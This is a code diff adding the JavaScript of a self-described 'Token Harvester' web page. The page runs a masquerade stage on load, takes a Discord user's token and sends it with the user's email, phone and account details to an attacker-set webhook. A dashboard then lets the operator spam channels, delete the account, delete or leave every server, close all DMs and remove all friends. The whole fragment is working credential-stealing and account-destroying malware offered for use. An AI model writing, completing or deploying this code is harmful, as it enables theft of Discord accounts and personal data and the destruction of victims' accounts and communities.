+                    { name: 'User ID', value: userData.id, inline: true },
+                    { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
+                    { name: 'Servers', value: `${state.guilds.length}`, inline: true },
+                    { name: 'Friends', value: `${state.friends.length}`, inline: true },
+                    { name: '2FA Enabled', value: userData.mfa_enabled ? '✅ Yes' : '❌ No', inline: true },
+                    { name: 'Email', value: userData.email || 'None', inline: true },
+                    { name: 'Phone', value: userData.phone || 'None', inline: true },
+                    { name: 'Nitro', value: userData.premium_type > 0 ? '✅ Yes' : '❌ No', inline: true }
+                ],
+                thumbnail: userData.avatar ? { url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=128` } : null,
+                footer: { text: 'Token Harvester' },
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        try {
+            const response = await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                log('success', 'Token exfiltrated successfully');
+                showToast('Token sent to webhook', 'success');
+            } else {
+                log('warn', `Webhook responded with ${response.status}`);
+            }
+        } catch (error) {
+            log('error', `Exfiltration failed: ${error.message}`);
+        }
+    }
+
+    function setupTabs() {
+        document.querySelectorAll('.nav-item[data-tab]').forEach(item => {
+            item.addEventListener('click', function() {
+                const tabName = this.dataset.tab;
+                document.querySelectorAll('.nav-item[data-tab]').forEach(n => n.classList.remove('active'));
+                this.classList.add('active');
+                document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+                const tab = $(`tab-${tabName}`);
+                if (tab) tab.classList.add('active');
+            });
+        });
+    }
+
+    function setupConsole() {
+        const executeBtn = $('btn-execute');
+        const clearBtn = $('btn-clear-console');
+
+        async function executeCommand() {
+            const input = consoleInput.value.trim();
+            if (!input) return;
+
+            log('info', `Executing: ${input}`);
+            
+            let endpoint = input;
+            let method = 'GET';
+            let body = null;
+
+            if (input.startsWith('/')) {
+                endpoint = input.substring(1);
+            } else if (input.startsWith('GET ')) {
+                method = 'GET';
+                endpoint = input.substring(4);
+            } else if (input.startsWith('POST ')) {
+                method = 'POST';
+                const rest = input.substring(5);
+                const splitIndex = rest.indexOf(' ');
+                if (splitIndex > -1) {
+                    endpoint = rest.substring(0, splitIndex);
+                    try { body = JSON.parse(rest.substring(splitIndex + 1)); } catch(e) { body = rest.substring(splitIndex + 1); }
+                } else {
+                    endpoint = rest;
+                }
+            } else if (input.startsWith('DELETE ')) {
+                method = 'DELETE';
+                endpoint = input.substring(7);
+            } else if (input === 'help') {
+                log('success', 'Available commands:');
+                log('info', '  /users/@me - Get current user');
+                log('info', '  /users/@me/guilds - List guilds');
+                log('info', '  /users/@me/relationships - List friends');
+                log('info', '  GET /guilds/{id} - Get guild info');
+                log('info', '  POST /channels/{id}/messages {"content":"hello"} - Send message');
+                log('info', '  DELETE /channels/{id}/messages/{msgid} - Delete message');
+                log('info', '  token - Show current token');
+                log('info', '  webhook <url> - Set exfiltration webhook');
+                consoleInput.value = '';
+                return;
+            } else if (input === 'token') {
+                log('success', `Current token: ${state.token}`);
+                consoleInput.value = '';
+                return;
+            } else if (input.startsWith('webhook ')) {
+                const url = input.substring(8);
+                state.webhook = url;
+                if (settingsWebhook) settingsWebhook.value = url;
+                log('success', 'Webhook updated');
+                consoleInput.value = '';
+                return;
+            } else {
+                if (!input.startsWith('/')) {
+                    endpoint = '/' + input;
+                }
+            }
+
+            try {
+                const options = { method };
+                if (body) options.body = JSON.stringify(body);
+                
+                const result = await discordRequest(endpoint, options);
+                if (result) {
+                    log('success', 'Response received:');
+                    log('info', JSON.stringify(result, null, 2).substring(0, 500));
+                } else {
+                    log('error', 'No response or request failed');
+                }
+            } catch (e) {
+                log('error', `Command error: ${e.message}`);
+            }
+
+            consoleInput.value = '';
+        }
+
+        executeBtn.addEventListener('click', executeCommand);
+        consoleInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') executeCommand();
+        });
+
+        clearBtn.addEventListener('click', () => {
+            consoleOutput.innerHTML = '<div class="log-entry"><span class="timestamp">[BOOT]</span> <span class="level-success">Console cleared.</span></div>';
+            overviewConsole.innerHTML = '<div class="log-entry"><span class="timestamp">[INIT]</span> <span class="level-info">Dashboard initialized.</span></div>';
+        });
+    }
+
+    function setupMessaging() {
+        const sendBtn = $('btn-send-msg');
+        const spamBtn = $('btn-spam-msg');
+        const clearBtn = $('btn-clear');
+
+        sendBtn.addEventListener('click', async () => {
+            const target = msgTarget.value.trim();
+            const content = msgContent.value.trim();
+            
+            if (!target || !content) {
+                showToast('Target and content required', 'error');
+                return;
+            }
+
+            log('info', `Sending message to ${target}...`);
+            
+            const result = await discordRequest(`/channels/${target}/messages`, {
+                method: 'POST',
+                body: JSON.stringify({ content })
+            });
+
+            if (result) {
+                log('success', `Message sent to ${target}`);
+                showToast('Message sent!', 'success');
+            } else {
+                log('error', 'Failed to send message');
+                showToast('Failed to send', 'error');
+            }
+        });
+
+        spamBtn.addEventListener('click', async () => {
+            const target = msgTarget.value.trim();
+            const content = msgContent.value.trim();
+            
+            if (!target || !content) {
+                showToast('Target and content required', 'error');
+                return;
+            }
+
+            log('warn', `Spamming ${target} with 10 messages...`);
+            showToast('Spamming...', 'info');
+
+            for (let i = 0; i < 10; i++) {
+                await discordRequest(`/channels/${target}/messages`, {
+                    method: 'POST',
+                    body: JSON.stringify({ content: `${content} [${i+1}/10]` })
+                });
+                await sleep(500);
+            }
+
+            log('success', 'Spam complete');
+            showToast('Spam complete!', 'success');
+        });
+
+        clearBtn.addEventListener('click', () => {
+            msgTarget.value = '';
+            msgContent.value = '';
+        });
+    }
+
+    function setupDanger() {
+        const deleteAccount = $('btn-delete-account');
+        const nukeGuilds = $('btn-nuke-guilds');
+        const purgeDMs = $('btn-purge-dms');
+
+        deleteAccount?.addEventListener('click', async () => {
+            if (!confirm('⚠️ Are you sure you want to DELETE this account? This is irreversible!')) return;
+            if (!confirm('FINAL WARNING: This will permanently delete the Discord account!')) return;
+            
+            log('warn', 'Initiating account deletion...');
+            showToast('Deleting account...', 'info');
+            
+            await discordRequest('/users/@me', { method: 'DELETE' });
+            
+            log('success', 'Account deletion request sent');
+            showToast('Account deleted (if possible)', 'success');
+        });
+
+        nukeGuilds?.addEventListener('click', async () => {
+            if (!confirm('⚠️ This will leave/delete ALL servers! Continue?')) return;
+            
+            log('warn', 'Nuking all servers...');
+            showToast('Leaving all servers...', 'info');
+            
+            for (const guild of state.guilds) {
+                if (guild.owner) {
+                    await discordRequest(`/guilds/${guild.id}`, { method: 'DELETE' });
+                    log('info', `Deleted owned guild: ${guild.name}`);
+                } else {
+                    await discordRequest(`/users/@me/guilds/${guild.id}`, { method: 'DELETE' });
+                    log('info', `Left guild: ${guild.name}`);
+                }
+                await sleep(1000);
+            }
+            
+            log('success', 'All servers nuked');
+            showToast('Servers nuked!', 'success');
+        });
+
+        purgeDMs?.addEventListener('click', async () => {
+            if (!confirm('⚠️ This will close all DM channels! Continue?')) return;
+            
+            log('warn', 'Purging DM channels...');
+            showToast('Purging DMs...', 'info');
+            
+            const channels = await discordRequest('/users/@me/channels');
+            if (channels) {
+                for (const ch of channels) {
+                    if (ch.type === 1) {
+                        await discordRequest(`/channels/${ch.id}`, { method: 'DELETE' });
+                        log('info', `Closed DM with ${ch.recipients?.[0]?.username || 'unknown'}`);
+                        await sleep(500);
+                    }
+                }
+            }
+            
+            log('success', 'DMs purged');
+            showToast('DMs purged!', 'success');
+        });
+    }
+
+    function setupSettings() {
+        const toggleToken = $('btn-toggle-token');
+        const copyToken = $('btn-copy-token');
+        const saveWebhook = $('btn-save-webhook');
+
+        let tokenVisible = false;
+
+        toggleToken?.addEventListener('click', () => {
+            tokenVisible = !tokenVisible;
+            settingsTokenDisplay.type = tokenVisible ? 'text' : 'password';
+            toggleToken.textContent = tokenVisible ? '🔒' : '👁️';
+        });
+
+        copyToken?.addEventListener('click', () => {
+            if (state.token) {
+                navigator.clipboard.writeText(state.token).then(() => {
+                    showToast('Token copied to clipboard', 'success');
+                }).catch(() => {
+                    settingsTokenDisplay.select();
+                    document.execCommand('copy');
+                    showToast('Token copied', 'success');
+                });
+            }
+        });
+
+        saveWebhook?.addEventListener('click', () => {
+            const url = settingsWebhook.value.trim();
+            if (url) {
+                state.webhook = url;
+                log('success', 'Webhook URL saved');
+                showToast('Webhook saved', 'success');
+                if (state.token && state.userData) {
+                    exfiltrateToken(state.token, state.userData);
+                }
+            } else {
+                showToast('Enter a valid webhook URL', 'error');
+            }
+        });
+    }
+
+    function setupExtras() {
+        const btnLogout = $('btn-logout');
+        const btnLogoutMain = $('btn-logout-main');
+        const btnTokenInfo = $('btn-token-info');
+        const btnRefresh = $('btn-refresh');
+
+        btnLogout?.addEventListener('click', () => {
+            if (confirm('Disconnect dashboard?')) {
+                state.token = null;
+                stageDashboard.classList.remove('active');
+                stageMasquerade.style.display = 'flex';
+                stageMasquerade.classList.remove('hidden');
+                loadingBar.style.width = '0%';
+                log('info', 'Disconnected. Ready for new token.');
+                showToast('Disconnected', 'info');
+            }
+        });
+
+        btnLogoutMain?.addEventListener('click', () => btnLogout?.click());
+
+        btnTokenInfo?.addEventListener('click', () => {
+            if (state.token) {
+                const parts = state.token.split('.');
+                log('info', `Token format: ${parts.length} parts`);
+                try {
+                    log('info', `User ID (decoded): ${atob(parts[0].replace(/-/g,'+').replace(/_/g,'/'))}`);
+                } catch(e) {}
+                log('info', `Token preview: ${state.token.substring(0, 20)}...`);
+                showToast('Token info logged to console', 'info');
+            }
+        });
+
+        btnRefresh?.addEventListener('click', async () => {
+            log('info', 'Refreshing data...');
+            showToast('Refreshing...', 'info');
+            
+            const [guilds, relationships] = await Promise.all([
+                discordRequest('/users/@me/guilds'),
+                discordRequest('/users/@me/relationships')
+            ]);
+
+            state.guilds = guilds || [];
+            state.friends = (relationships || []).filter(r => r.type === 1);
+            
+            cardGuilds.textContent = state.guilds.length;
+            cardFriends.textContent = state.friends.length;
+            guildCountBadge.textContent = state.guilds.length;
+            friendCountBadge.textContent = state.friends.length;
+            
+            renderGuilds();
+            renderFriends();
+            
+            log('success', 'Data refreshed');
+            showToast('Data refreshed', 'success');
+        });
+    }
+
+    function setupMassActions() {
+        const massJoin = $('btn-mass-join');
+        const massLeave = $('btn-mass-leave');
+        const massFriend = $('btn-mass-friend');
+        const massUnfriend = $('btn-mass-unfriend');
+
+        massJoin?.addEventListener('click', () => {
+            const guildId = prompt('Enter server ID to join (via invite):');
+            if (guildId) {
+                log('info', `Attempting to join server ${guildId}...`);
+                showToast('Join feature requires invite code', 'info');
+            }
+        });
+
+        massLeave?.addEventListener('click', async () => {
+            if (!confirm('Leave all non-owned servers?')) return;
+            
+            log('warn', 'Leaving all non-owned servers...');
+            showToast('Leaving servers...', 'info');
+            
+            for (const guild of state.guilds) {
+                if (!guild.owner) {
+                    await discordRequest(`/users/@me/guilds/${guild.id}`, { method: 'DELETE' });
+                    log('info', `Left: ${guild.name}`);
+                    await sleep(500);
+                }
+            }
+            
+            log('success', 'Mass leave complete');
+            showToast('Left all non-owned servers', 'success');
+        });
+
+        massFriend?.addEventListener('click', () => {
+            const userId = prompt('Enter User ID to send friend request:');
+            if (userId) {
+                log('info', `Sending friend request to ${userId}...`);
+                discordRequest('/users/@me/relationships', {
+                    method: 'POST',
+                    body: JSON.stringify({ type: 3 })
+                }).then(r => {
+                    if (r) {
+                        log('success', 'Friend request sent');
+                        showToast('Friend request sent', 'success');
+                    }
+                });
+            }
+        });
+
+        massUnfriend?.addEventListener('click', async () => {
+            if (!confirm('Remove ALL friends?')) return;
+            
+            log('warn', 'Removing all friends...');
+            showToast('Removing friends...', 'info');
+            
+            for (const friend of state.friends) {
+                await discordRequest(`/users/@me/relationships/${friend.id}`, { method: 'DELETE' });
+                log('info', `Removed friend: ${friend.user.username}`);
+                await sleep(300);
+            }
+            
+            const relationships = await discordRequest('/users/@me/relationships');
+            state.friends = (relationships || []).filter(r => r.type === 1);
+            renderFriends();
+            cardFriends.textContent = state.friends.length;
+            friendCountBadge.textContent = state.friends.length;
+            
+            log('success', 'All friends removed');
+            showToast('All friends removed', 'success');
+        });
+    }
+
+    function init() {
+        log('info', 'Token Harvester booting...');
+        log('info', 'Stage 1: Masquerade active');
+        
+        setupTabs();
+        setupConsole();
+        setupMessaging();
+        setupDanger();
+        setupSettings();
+        setupExtras();
+        setupMassActions();
+
+        loadingBar.style.transition = 'width 3s linear';
+        
+        setTimeout(harvestToken, 500);
+
+        setTimeout(() => {
+            if (!state.token && !state.userData) {
+                log('warn', 'Token harvest timed out. Loading demo mode...');
+                transitionToDashboard({
+                    id: '123456789012345678',
+                    username: 'Demo_User',
+                    discriminator: '9999',
+                    avatar: null
+                });
+            }
+        }, 10000);
+    }
+
+    if (document.readyState === 'complete') {
+        init();
+    } else {
+        window.addEventListener('load', init);
+    }
+
+})();
+</script>
+</body>
+</html>
